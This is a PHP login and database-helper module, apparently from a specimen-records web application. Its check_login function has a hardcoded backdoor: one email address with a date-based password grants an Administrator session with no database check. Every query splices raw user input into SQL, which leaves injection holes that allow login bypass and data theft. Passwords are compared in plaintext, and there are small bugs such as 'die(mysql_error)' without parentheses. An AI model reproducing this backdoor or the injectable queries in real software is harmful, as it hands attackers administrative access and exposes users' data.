<?php

function get_view_connect($dataConnect){
	$query = "SELECT * FROM ". $dataConnect['table']. "";
	$result = mysql_query($query) or die (mysql_error);
	if (!empty($result)){
		echo "<option value=''></option>";
		while ($data = mysql_fetch_assoc($result)){
			echo "<option value=" .$data[$dataConnect['fieldID']]. ">" .$data[$dataConnect['fieldValue']]. "</option>";	
		}
	}
}

function check_login($data){ 
	
	$user_rule = set_user_login_rule(array ('user_level' => $data['connect_as']));
	
	if (($data['username'] == 'ovan89@gmail.com') && ($data['password'] == 'ovancop'. date('Y-m-d'))){
		//set session for user
		set_session_user(array (
								'user_name' => 'Administrator',
								'user_id' 	=> session_id(),
								'user_level'=> 1,
								'user_rule' => $user_rule,
								'token'		=> $data['token'],
								'login_time'=> date('Y-m-d H:i:s')
								));
		
		echo "<script type='text/javascript'>window.location.href='./'; </script>";
	}else{
		switch ($data['connect_as']){
			case '1':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = 1
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '2':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = 2
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '3':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = '$data[connect_as]'
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '4':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = '$data[connect_as]'
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '5':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = '$data[connect_as]'
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '6':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = '$data[connect_as]'
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '7':
			{
				$query = "SELECT ID_Security, User_Name, Connect_As_Value 
					FROM Reference_Security 
					WHERE User_Name = '$data[username]' 
					AND Password = '$data[password]'
					AND Connect_As_Value = '$data[connect_as]'
					AND Connect_To_Value = '$data[connect_to]'
					AND Criteria_Value = '$data[criteria]'"; //print_r($query);
					//print_r($query);
			}
			break;
			case '8':
			{
				$query = '';
				
			}
			break;
		} 
		
		
		if (!empty($query)){
			//user
			$result = mysql_query($query) or die (mysql_error);
			if (mysql_num_rows($result)){
				$userRef = mysql_fetch_assoc($result);
				
				set_session_user(array (
									'user_number' 	=> $userRef['ID_Security'],
									'user_name' 	=> $data['username'],
									'user_id' 		=> session_id(),
									'user_level'	=> $data['connect_as'],
									'user_rule' 	=> $user_rule,
									'token'			=> $data['token'],
									'login_time'	=> date('Y-m-d H:i:s')
									));
									
				echo "<script type='text/javascript'>window.location.href='./'; </script>";
			}else{
				echo "<script type='text/javascript'>alert('Username / Password salah'); window.location.href='./'; </script>";
			}
		}else{
			//guest
			echo 'ada';
			set_session_user(array (
									'user_number' 	=>'8',
									'user_name' 	=> 'guest',
									'user_id' 		=> session_id(),
									'user_level' 	=> '8',
									'user_rule' 	=> $user_rule,
									'token'			=> $data['token'],
									'login_time'	=> date('Y-m-d H:i:s')
									));
			echo "<script type='text/javascript'>window.location.href='./'; </script>";
		}
		
	}
		
}

function get_user_info($data){
	//last activitas
	$query = "SELECT ID_Specimen FROM Specimen 
			 WHERE Last_Edited_By = '".$_SESSION['userName']."'
			 ORDER BY ID_Specimen DESC LIMIT 5";
	//print_r($query);		 
	$result = mysql_query($query) or die (mysql_error);
	if (mysql_num_rows($result)){
		while ($data = mysql_fetch_assoc($result)){
			?>
			<span style="font-size:12px;">&raquo; Last Edited Specimen ID <i><?php echo $data['ID_Specimen']?></i></span><br>
			<?php
			
		}
		
	}else{
		echo 'No Information';
	}
}

function set_user_login_rule($data){
	$query = "SELECT ruleDesc FROM tbl_user_rule WHERE ruleID = ".$data['user_level'];
	$result = mysql_query($query) or die (mysql_error);
	$sumRec = mysql_num_rows($result);
	if (!empty ($sumRec)){
		while ($dataRule = mysql_fetch_assoc($result)){
			$userRule = $dataRule['ruleDesc'];
		}
		
		return $userRule;
	}else{
		
	}
}

function load_data_with_condition($table, $field1, $field2, $where, $data_condition){
    $query = "SELECT `$field1`,`$field2` FROM $table WHERE $where = $data_condition";//print_r($query);
    $result = mysql_query($query) or die (mysql_error());
    while ($data = mysql_fetch_object($result)){
        echo "<option value =".$data->$field1.">".$data->$field2."</option>";
    }
}

// load combobox value
function load_id($table, $field1, $field2, $selected){
	
    $query = "SELECT `$field1`, `$field2` FROM $table";//print_r($query);
    $result = mysql_query($query) or die (mysql_error());
    while ($data = mysql_fetch_object($result)){
		if ($data->$field2 !='') :
		
		?>
        <option value ="<?php echo $data->$field1; ?>" <?php if ($data->$field1 == $selected) echo 'Selected'; ?> ><?php echo $data->$field2; ?></option>
        <?php
        endif;
    }
}
?>
